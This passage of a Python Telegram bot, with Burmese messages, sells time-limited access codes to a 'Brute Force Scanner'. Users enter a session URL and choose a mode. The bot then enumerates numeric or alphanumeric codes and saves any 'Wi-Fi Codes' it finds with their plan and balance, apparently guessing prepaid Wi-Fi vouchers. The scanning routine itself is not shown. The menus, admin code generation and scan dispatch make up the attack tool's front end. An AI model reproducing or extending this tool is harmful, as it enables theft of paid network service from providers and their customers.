    target = update.message if update.message else update.callback_query.message
    await show_main_menu(target, user.id, user.username)


async def ask_code_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    context.user_data['waiting_for_code'] = True
    context.user_data['waiting_for_url'] = False
    await query.message.reply_text(
        "🔑 ကျေးဇူးပြု၍ သင့်ထံတွင်ရှိသော Access Code ကို "
        "ဤချတ်ဘောက်စ်ထဲတွင် ရိုက်ထည့်ပေးပါရန်။",
        parse_mode="Markdown")


async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message
    if not message or not message.text:
        return
    user_id = message.from_user.id
    text = message.text.strip()

    # Access code flow
    if context.user_data.get('waiting_for_code', False):
        cursor.execute("SELECT duration_type, is_used FROM access_codes WHERE code = ?", (text,))
        row = cursor.fetchone()

        if row is None:
            await message.reply_text("❌ မှားယွင်းနေသော Access Code ဖြစ်ပါသည်။ Admin ထံတွင် တောင်းခံပါ။")
            return

        duration_type, is_used = row[0], row[1]
        if is_used == 1:
            await message.reply_text("⚠️ ဤ Access Code ကို အသုံးပြုပြီးသား ဖြစ်ပါသည်။")
            return

        duration_seconds = 0
        if "မိနစ်" in duration_type:
            duration_seconds = int(duration_type.replace("မိနစ်", "")) * 60
        elif "နာရီ" in duration_type:
            duration_seconds = int(duration_type.replace("နာရီ", "")) * 3600
        elif "ရက်" in duration_type:
            duration_seconds = int(duration_type.replace("ရက်", "")) * 86400

        expiry_time = time.time() + duration_seconds

        async with db_lock:
            cursor.execute("UPDATE access_codes SET is_used = 1, used_by = ? WHERE code = ?",
                           (user_id, text))
            cursor.execute(
                "INSERT OR REPLACE INTO authorized_users (user_id, duration_type, expiry_time) VALUES (?, ?, ?)",
                (user_id, duration_type, expiry_time))
            conn.commit()

        context.user_data['waiting_for_code'] = False
        await message.reply_text(
            f"✅ **Access Granted!** သက်တမ်း ({duration_type}) ဖြင့် "
            f"အောင်မြင်စွာ စတင်အသုံးပြုနိုင်ပါပြီ။",
            parse_mode="Markdown")
        await show_main_menu(message, user_id, message.from_user.username)
        return

    # Session URL flow
    if context.user_data.get('waiting_for_url', False):
        if text.startswith("http://") or text.startswith("https://"):
            async with db_lock:
                cursor.execute(
                    "INSERT OR REPLACE INTO user_sessions (user_id, session_url) VALUES (?, ?)",
                    (user_id, text))
                conn.commit()
            context.user_data['waiting_for_url'] = False

            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("🌐 Session URL Setup", callback_data="set_url"),
                 InlineKeyboardButton("🚀 Brute Force", callback_data="brute_menu")],
                [InlineKeyboardButton("💎 Saved Codes", callback_data="view_saved_codes")]
            ])
            await message.reply_text(
                "✅ **Session URL သိမ်းဆည်းပြီးပါပြီ။** အောက်ပါ Menu မှ ဆက်လုပ်နိုင်ပါပြီ -",
                reply_markup=keyboard, parse_mode="Markdown")
        else:
            await message.reply_text(
                "❌ URL ပုံစံ မှန်ကန်မှု မရှိပါ။ http:// သို့မဟုတ် https:// ဖြင့် စတင်ရပါမည်။")
        return


async def gen_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not is_admin(user.username):
        await update.message.reply_text("⛔ ဤဝිධානය (Command) ကို Admin သာ အသုံးပြုနိုင်ပါသည်။")
        return

    arg = ""
    if context.args:
        arg = context.args[0].strip()
    else:
        msg_text = update.message.text.strip()
        m = re.match(r'^/gen\s*(.+)$', msg_text, flags=re.IGNORECASE)
        if m:
            arg = m.group(1).strip()

    valid_durations = ["10မိနစ်", "30မိနစ်", "1နာရီ", "2နာရီ", "3နာရီ", "10နာရီ",
                       "1ရက်", "2ရက်", "3ရက်", "7ရက်", "15ရက်", "30ရက်"]

    if not arg or arg not in valid_durations:
        await update.message.reply_text(
            f"❌ ပုံစံမှားနေပါသည်။ ဥပမာ: `/gen 30မိနစ်` (သို့) `/gen30မိနစ်`\n\n"
            f"ရနိုင်သည်များ: {', '.join(valid_durations)}",
            parse_mode="Markdown")
        return

    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    async with db_lock:
        cursor.execute(
            "INSERT OR REPLACE INTO access_codes (code, duration_type, is_used) VALUES (?, ?, 0)",
            (code, arg))
        conn.commit()

    await update.message.reply_text(
        f"🔑 **Generated Access Code ({arg}):**\n\n`{code}`",
        parse_mode="Markdown")


async def set_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    username = query.from_user.username

    if not check_user_auth(user_id, username):
        await query.message.reply_text(
            "❌ သင့်အကောင့် သက်တမ်းကုန်ဆုံးသွားပါပြီ သို့မဟုတ် Access Code အရင်ထည့်ပါ။")
        return

    context.user_data['waiting_for_url'] = True
    context.user_data['waiting_for_code'] = False
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("❌ Cancel", callback_data="back_start")]])
    await query.message.reply_text(
        "🌐 **Session URL Setup**\n\nSession URL ကို ဤချတ်ဘောက်စ်ထဲတွင် "
        "ရိုက်ထည့်ပါ သို့မဟုတ် paste လုပ်ပါ:",
        reply_markup=keyboard, parse_mode="Markdown")


async def brute_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    username = query.from_user.username

    if not check_user_auth(user_id, username):
        await query.message.reply_text(
            "❌ သင့်အကောင့် သက်တမ်းကုန်ဆုံးသွားပါပြီ သို့မဟုတ် Access Code အရင်ထည့်ပါ။")
        return

    cursor.execute("SELECT session_url FROM user_sessions WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    if not row:
        await query.message.reply_text(
            "❌ ကျေးဇူးပြု၍ ပထမဦးစွာ `Session URL Setup` ဖြင့် URL ထည့်သွင်းပါရန်။",
            parse_mode="Markdown")
        return

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("6 လုံး (0-9)", callback_data="mode_6"),
         InlineKeyboardButton("7 လုံး (0-9)", callback_data="mode_7")],
        [InlineKeyboardButton("8 လုံး (0-9)", callback_data="mode_8"),
         InlineKeyboardButton("9 လုံး (0-9)", callback_data="mode_9")],
        [InlineKeyboardButton("အက္ခရာ 6 လုံး (a-z)", callback_data="scan_alpha6"),
         InlineKeyboardButton("အရောအနှော 6 လုံး (a-z, 0-9)", callback_data="scan_mix6")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_start")]
    ])
    await query.message.reply_text(
        "🚀 **Brute Force Scanner**\n\nScan mode ကို ရွေးချယ်ပါ:",
        reply_markup=keyboard, parse_mode="Markdown")


async def view_saved_codes(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.callback_query:
        query = update.callback_query
        user = query.from_user
        reply_target = query.message
        await query.answer()
    else:
        user = update.effective_user
        reply_target = update.message

    user_id = user.id
    username = user.username

    if not check_user_auth(user_id, username):
        await reply_target.reply_text(
            "❌ သင့်အကောင့် သက်တမ်းကုန်ဆုံးသွားပါပြီ သို့မဟုတ် Access Code အရင်ထည့်ပါ။")
        return

    cursor.execute(
        "SELECT code, plan, time_val FROM found_codes_db WHERE user_id = ? ORDER BY rowid DESC LIMIT 50",
        (user_id,))
    rows = cursor.fetchall()

    if not rows:
        await reply_target.reply_text("📂 သင်သိမ်းဆည်းထားသော Wi-Fi Codes များ မရှိသေးပါ။")
        return

    result_text = f"💎 **Saved Codes (Latest {len(rows)})**\n\n"
    for idx, item in enumerate(rows, 1):
        result_text += f"{idx}. Code: `{item[0]}` | Plan: {item[1]} | Balance: {item[2]}\n"

    await reply_target.reply_text(result_text, parse_mode="Markdown")


async def back_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    context.user_data['waiting_for_url'] = False
    context.user_data['waiting_for_code'] = False
    context.user_data['scan_stop'] = True
    await show_main_menu(query.message, query.from_user.id, query.from_user.username)


async def stop_scanning(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['scan_stop'] = True
    await update.message.reply_text(
        "🛑 **စကန်ဖတ်ခြင်းကို ရပ်တန့်လိုက်ပါပြီ။**",
        parse_mode="Markdown")


async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    user_id = query.from_user.id

    if data == "ask_code":
        await ask_code_callback(update, context)
    elif data == "set_url":
        await set_url(update, context)
    elif data == "brute_menu":
        await brute_menu(update, context)
    elif data == "view_saved_codes":
        await view_saved_codes(update, context)
    elif data == "back_start":
        await back_start(update, context)
    elif data.startswith("mode_") or data.startswith("scan_"):
        await query.answer()
        cursor.execute("SELECT session_url FROM user_sessions WHERE user_id = ?", (user_id,))
        url_row = cursor.fetchone()
        if not url_row:
            await query.message.reply_text(
                "❌ Session URL မတွေ့ရှိပါ။ ကျေးဇူးပြု၍ URL အရင်ထည့်ပါ။")
            return

        session_url = url_row[0]
        mode = data.replace("mode_", "").replace("scan_", "")

        if mode == "6":
            total_codes_count = 1000000
        elif mode == "7":
            total_codes_count = 10000000
        elif mode == "8":
            total_codes_count = 100000000
        elif mode == "9":
            total_codes_count = 1000000000
        elif mode in ["alpha6", "mix6"]:
            total_codes_count = 300000
        else:
            total_codes_count = 1000000

        asyncio.create_task(run_scanner_background(
            query, session_url, mode, total_codes_count, context))


# ── MAIN ──────────────────────────────────────────────────────────────────
def main():
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop_scanning))
    app.add_handler(CommandHandler("gen", gen_key))
    app.add_handler(CommandHandler("saved", view_saved_codes))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))

    print("🚀 Telegram Bot စတင်အလုပ်လုပ်နေပါပြီ...")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
